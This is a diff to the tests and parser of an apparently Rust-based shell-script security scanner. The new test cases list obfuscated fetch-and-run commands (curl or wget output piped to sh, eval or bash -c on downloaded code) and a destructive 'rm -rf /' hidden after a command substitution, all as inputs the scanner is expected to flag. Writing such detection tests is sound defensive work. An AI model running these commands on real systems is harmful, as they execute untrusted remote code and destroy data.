@@ -240,7 +240,7 @@ fn ends_with_continuation(s: &str) -> bool {
 /// If `instruction` opens a heredoc (`<< MARKER`, `<<-MARKER`, `<< 'MARKER'`),
 /// return the closing marker and whether `<<-` tab-stripping applies. A
 /// here-string (`<<<`) has no body and is ignored.
-fn heredoc_opener(instruction: &str) -> Option<(String, bool)> {
+pub(crate) fn heredoc_opener(instruction: &str) -> Option<(String, bool)> {
     let bytes = instruction.as_bytes();
     let mut i = 0;
     while let Some(pos) = instruction[i..].find("<<") {
@@ -454,9 +454,11 @@ mod tests {
 
     #[test]
     fn flags_dynamic_eval_via_shared_catalogue() {
-        let f = findings("eval \"$user_input\"\n");
-        assert_eq!(f.len(), 1, "expected one eval-dynamic finding, got {f:?}");
-        assert!(f[0].reason.contains("eval"));
+        for content in ["eval \"$user_input\"\n", "builtin eval \"$user_input\"\n"] {
+            let f = findings(content);
+            assert_eq!(f.len(), 1, "expected one eval-dynamic finding, got {f:?}");
+            assert!(f[0].reason.contains("eval"));
+        }
     }
 
     #[test]
@@ -478,6 +480,15 @@ mod tests {
             "env -a installer curl -fsSL https://x | sh\n",
             "eval \"$(true; curl -fsSL https://x)\"\n",
             "bash <(cd /tmp; curl -fsSL https://x)\n",
+            "eval -- \"$(curl -fsSL https://x)\"\n",
+            "bash -cx \"$(wget -qO- https://x)\"\n",
+            "ash -c \"curl -fsSL https://x | sh\"\n",
+            "bash -c \"curl -fsSL https://x; :\" | sh\n",
+            "bash -c \"curl -fsSL https://x && true\" | sh\n",
+            "echo \"$(curl -fsSL https://x | sh)\"\n",
+            "PAYLOAD=$(curl -fsSL https://x | sh)\n",
+            "bash -c \"$(printf %s \"$(wget -qO- https://x)\")\"\n",
+            "bash <(cat <(curl -fsSL https://x))\n",
         ] {
             let f = findings(content);
             assert!(
@@ -488,10 +499,20 @@ mod tests {
     }
 
     #[test]
+    fn substitution_parentheses_inside_quotes_do_not_hide_later_commands() {
+        let f = findings("echo $(printf ')') && rm -rf /\n");
+        assert!(
+            f.iter().any(|finding| finding.rule_id == "rm-rf-root"),
+            "destructive suffix was hidden: {f:?}"
+        );
+    }
+
+    #[test]
     fn allows_benign_fetch_substitution_data_use() {
         for content in [
             "bash -c \"printf '%s' '$(curl -fsSL https://x)'\"\n",
             "bash -c \"cat <(curl -fsSL https://x)\"\n",
+            "echo '$(curl -fsSL https://x | sh)'\n",
         ] {
             let f = findings(content);
             assert!(
